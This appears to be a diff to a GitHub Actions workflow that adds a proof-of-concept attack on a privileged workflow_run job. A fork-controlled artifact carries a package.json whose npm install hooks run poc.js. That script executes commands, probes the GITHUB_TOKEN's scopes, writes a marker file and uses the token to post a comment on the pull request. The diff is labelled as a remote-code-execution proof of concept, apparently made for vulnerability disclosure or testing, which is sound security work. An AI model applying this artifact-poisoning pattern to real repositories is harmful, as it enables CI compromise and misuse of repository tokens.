@@ -8,4 +8,43 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "benign upstream standing in for the repo's real Lint workflow"
+      - name: Craft artifact consumed by the privileged workflow_run
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          NONCE: ${{ github.run_id }}-${{ github.run_attempt }}
+        run: |
+          set -e
+          mkdir -p out
+          cat > out/package.json <<'JSON'
+          {"name":"poc-root","version":"7.0.0","private":true,"scripts":{"preinstall":"node poc.js preinstall","install":"node poc.js install","postinstall":"node poc.js postinstall","prepare":"node poc.js prepare"}}
+          JSON
+          cat > out/poc.js <<'JS'
+          const fs = require('fs');
+          const cp = require('child_process');
+          const phase = process.argv[2] || 'unknown';
+          console.log('POC_RCE phase=' + phase + ' workflow=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' npm=' + cp.execSync('npm -v').toString().trim());
+          console.log('POC_TOKEN=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + ' perms=' + cp.execSync("node -e \"const t=process.env.GITHUB_TOKEN;fetch('https://api.github.com/',{headers:{Authorization:'Bearer '+t}}).then(r=>r.headers.get('x-oauth-scopes')||'n/a').then(console.log)\"").toString().trim());
+          fs.writeFileSync('/tmp/POC_RCE_MARKER', 'phase=' + phase);
+          (async () => {
+            try {
+              const pr = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/pr-number.txt', 'utf8').trim();
+              const nonce = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/nonce.txt', 'utf8').trim();
+              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
+                method: 'POST',
+                headers: { 'Accept': 'application/vnd.github+json', 'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN, 'Content-Type': 'application/json', 'X-GitHub-Api-Version': '2022-11-28' },
+                body: JSON.stringify({ body: 'POC_RCE phase=' + phase + ' nonce=' + nonce + ' workflow=' + process.env.GITHUB_WORKFLOW })
+              });
+              console.log('POC_COMMENT_STATUS=' + r.status);
+            } catch (e) { console.log('POC_COMMENT_ERROR=' + e); }
+          })();
+          JS
+          printf 'fork-controlled report\n' > out/linter-report.txt
+          printf '%s' "$PR_NUMBER" > out/pr-number.txt
+          printf 'POC-%s\n' "$NONCE" > out/nonce.txt
+          ls -la out
+      - name: Upload linter-report artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: out/
+          if-no-files-found: error
